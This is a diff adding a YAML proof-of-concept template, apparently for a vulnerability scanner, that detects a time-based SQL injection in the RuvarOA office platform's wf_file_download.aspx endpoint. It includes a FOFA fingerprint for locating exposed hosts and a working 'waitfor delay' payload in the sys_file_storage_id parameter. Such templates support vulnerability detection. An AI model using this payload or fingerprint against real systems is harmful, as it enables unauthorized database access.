@@ -1,0 +1,27 @@
+id: poc-yaml-ruvaroa-wf-file-download-sqli
+info:
+  name: RuvarOA wf_file_download SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ruvar-oa
+  fofa: body="txt_admin_key"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /login.aspx
+  expression: status_code == 200 && contains(body,"RuvarOA协同办公平台")
+- method: GET
+  path: /Mobile/WorkFlow/wf_file_download.aspx?attach_type=1&sys_file_storage_id=1+waitfor+delay+'0:0:{{.t1}}'+--+
+  expression: 'status_code == 200 &&
+
+    body == "" &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
